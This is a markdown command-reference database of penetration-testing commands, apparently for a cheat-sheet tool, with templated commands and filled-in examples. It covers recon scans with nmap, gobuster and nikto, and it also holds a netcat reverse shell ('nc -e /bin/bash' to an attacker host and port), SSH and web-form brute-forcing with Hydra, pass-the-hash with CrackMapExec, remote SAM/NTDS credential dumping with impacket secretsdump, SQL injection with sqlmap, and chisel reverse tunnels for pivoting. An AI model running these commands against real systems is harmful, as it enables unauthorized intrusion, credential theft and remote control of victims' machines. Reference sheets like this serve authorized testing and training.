<!--
  cmdref DB — Network Reconnaissance & Exploitation
  ===================================================
  Each command lives between two  ---  separators.
  Follow the template below for consistent parsing.

  Template reminder
  ─────────────────
  Description : <one-line summary>
  Parameters  : #variable_name  #another_variable
  [cmd block]  tool {{variable_name}} {{another_variable}}
  [example]    tool 10.10.10.10 output.txt
  Tags : #tool_name #category  #linux or #windows  (at least one is required)
-->

# Network Reconnaissance & Exploitation

---

Description :
    Aggressive Nmap scan — OS, version, scripts, traceroute

Parameters : #cmd_ref_target #cmd_ref_param_file

```cmd
nmap -A {{cmd_ref_target}} -oN {{cmd_ref_param_file}}
```

```example
nmap -A 10.10.10.10 -oN output.txt
```

Tags : #nmap #scan #recon #linux

---

Description :
    Aggressive Nmap with T4 timing (faster, noisier)

Parameters : #cmd_ref_target #cmd_ref_param_file

```cmd
nmap -A {{cmd_ref_target}} -oN {{cmd_ref_param_file}} -T4
```

```example
nmap -A 10.10.10.10 -oN output.txt -T4
```

Tags : #nmap #scan #recon #linux

---

Description :
    Full TCP port scan — all 65535 ports

Parameters : #cmd_ref_target #cmd_ref_param_file

```cmd
nmap -p- {{cmd_ref_target}} -oN {{cmd_ref_param_file}}
```

```example
nmap -p- 10.10.10.10 -oN full-ports.txt
```

Tags : #nmap #scan #full #linux

---

Description :
    Nmap UDP scan — top 200 common UDP ports

Parameters : #cmd_ref_target #cmd_ref_param_file

```cmd
nmap -sU --top-ports 200 {{cmd_ref_target}} -oN {{cmd_ref_param_file}}
```

```example
nmap -sU --top-ports 200 10.10.10.10 -oN udp-scan.txt
```

Tags : #nmap #scan #udp #linux

---

Description :
    Ping sweep — discover live hosts on a subnet

Parameters : #cmd_ref_target

```cmd
nmap -sn {{cmd_ref_target}}
```

```example
nmap -sn 10.10.10.0/24
```

Tags : #nmap #discovery #linux

---

Description :
    Gobuster directory brute-force

Parameters : #cmd_ref_url #cmd_ref_param_file_users #cmd_ref_param_file

```cmd
gobuster dir -u {{cmd_ref_url}} -w {{cmd_ref_param_file_users}} -o {{cmd_ref_param_file}}
```

```example
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -o dirs.txt
```

Tags : #gobuster #web #directory #bruteforce #linux

---

Description :
    Gobuster DNS subdomain enumeration

Parameters : #cmd_ref_domain #cmd_ref_param_file_users #cmd_ref_param_file

```cmd
gobuster dns -d {{cmd_ref_domain}} -w {{cmd_ref_param_file_users}} -o {{cmd_ref_param_file}}
```

```example
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt -o subs.txt
```

Tags : #gobuster #dns #recon #linux

---

Description :
    Nikto web server vulnerability scanner

Parameters : #cmd_ref_url #cmd_ref_param_file

```cmd
nikto -h {{cmd_ref_url}} -o {{cmd_ref_param_file}}
```

```example
nikto -h http://10.10.10.10 -o nikto-output.txt
```

Tags : #nikto #web #scan #linux

---

Description :
    WFuzz — web fuzzer for hidden parameters or paths

Parameters : #cmd_ref_url #cmd_ref_param_file_users

```cmd
wfuzz -c -z file,{{cmd_ref_param_file_users}} --hc 404 {{cmd_ref_url}}/FUZZ
```

```example
wfuzz -c -z file,common.txt --hc 404 http://10.10.10.10/FUZZ
```

Tags : #wfuzz #web #fuzzing #linux

---

Description :
    Netcat reverse shell listener

Parameters : #cmd_ref_attacker_port

```cmd
nc -lvnp {{cmd_ref_attacker_port}}
```

```example
nc -lvnp 9999
```

Tags : #netcat #shell #listener #linux

---

Description :
    Netcat connect back (victim side)

Parameters : #cmd_ref_attacker #cmd_ref_attacker_port

```cmd
nc -e /bin/bash {{cmd_ref_attacker}} {{cmd_ref_attacker_port}}
```

```example
nc -e /bin/bash 127.0.0.1 9999
```

Tags : #netcat #shell #linux

---

Description :
    SMB enumeration with enum4linux

Parameters : #cmd_ref_target

```cmd
enum4linux -a {{cmd_ref_target}}
```

```example
enum4linux -a 10.10.10.10
```

Tags : #enum4linux #smb #recon #linux

---

Description :
    CrackMapExec — SMB login check with credential lists

Parameters : #cmd_ref_target #cmd_ref_param_file_users #cmd_ref_param_file_pass

```cmd
crackmapexec smb {{cmd_ref_target}} -u {{cmd_ref_param_file_users}} -p {{cmd_ref_param_file_pass}}
```

```example
crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt
```

Tags : #crackmapexec #smb #bruteforce #linux

---

Description :
    CrackMapExec — SMB with NTLM pass-the-hash

Parameters : #cmd_ref_target #cmd_ref_param_file_users #cmd_Ref_target_hash

```cmd
crackmapexec smb {{cmd_ref_target}} -u {{cmd_ref_param_file_users}} -H {{cmd_Ref_target_hash}}
```

```example
crackmapexec smb 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee
```

Tags : #crackmapexec #smb #pth #linux

---

Description :
    Hydra SSH brute-force attack

Parameters : #cmd_ref_target #cmd_ref_param_file_users #cmd_ref_param_file_pass

```cmd
hydra -L {{cmd_ref_param_file_users}} -P {{cmd_ref_param_file_pass}} ssh://{{cmd_ref_target}}
```

```example
hydra -L users.txt -P rockyou.txt ssh://10.10.10.10
```

Tags : #hydra #bruteforce #ssh #linux

---

Description :
    Hydra HTTP POST form brute-force

Parameters : #cmd_ref_url #cmd_ref_param_file_users #cmd_ref_param_file_pass

```cmd
hydra -L {{cmd_ref_param_file_users}} -P {{cmd_ref_param_file_pass}} {{cmd_ref_url}} http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

```example
hydra -L users.txt -P rockyou.txt http://10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

Tags : #hydra #bruteforce #web #linux

---

Description :
    SQLMap — automatic SQL injection detection and exploitation

Parameters : #cmd_ref_url #cmd_ref_param_file

```cmd
sqlmap -u {{cmd_ref_url}} --batch --output-dir={{cmd_ref_param_file}}
```

```example
sqlmap -u http://10.10.10.10/page?id=1 --batch --output-dir=./sqlmap-out
```

Tags : #sqlmap #sqli #web #linux

---

Description :
    Impacket secretsdump — remote SAM / NTDS dump

Parameters : #cmd_ref_target #cmd_ref_domain #cmd_ref_param_file_users #cmd_ref_param_file_pass

```cmd
impacket-secretsdump {{cmd_ref_domain}}/{{cmd_ref_param_file_users}}:{{cmd_ref_param_file_pass}}@{{cmd_ref_target}}
```

```example
impacket-secretsdump WORKGROUP/administrator:Password123@10.10.10.10
```

Tags : #impacket #secretsdump #windows #linux

---

Description :
    WinPEAS — Windows privilege escalation enumeration (run on target)

Parameters : #cmd_ref_param_file

```cmd
.\winPEASx64.exe > {{cmd_ref_param_file}}
```

```example
.\winPEASx64.exe > winpeas_output.txt
```

Tags : #winpeas #privesc #windows

---

Description :
    LinPEAS — Linux privilege escalation enumeration

Parameters : #cmd_ref_param_file

```cmd
./linpeas.sh | tee {{cmd_ref_param_file}}
```

```example
./linpeas.sh | tee linpeas_output.txt
```

Tags : #linpeas #privesc #linux

---

Description :
    Chisel — TCP tunnel (server side on attacker machine)

Parameters : #cmd_ref_attacker_port

```cmd
./chisel server --port {{cmd_ref_attacker_port}} --reverse
```

```example
./chisel server --port 9999 --reverse
```

Tags : #chisel #tunnel #pivot #linux

---

Description :
    Chisel — TCP tunnel (client side on victim machine)

Parameters : #cmd_ref_attacker #cmd_ref_attacker_port #cmd_ref_target_port

```cmd
./chisel client {{cmd_ref_attacker}}:{{cmd_ref_attacker_port}} R:{{cmd_ref_target_port}}:127.0.0.1:{{cmd_ref_target_port}}
```

```example
./chisel client 127.0.0.1:9999 R:51:127.0.0.1:51
```

Tags : #chisel #tunnel #pivot #linux #windows

---
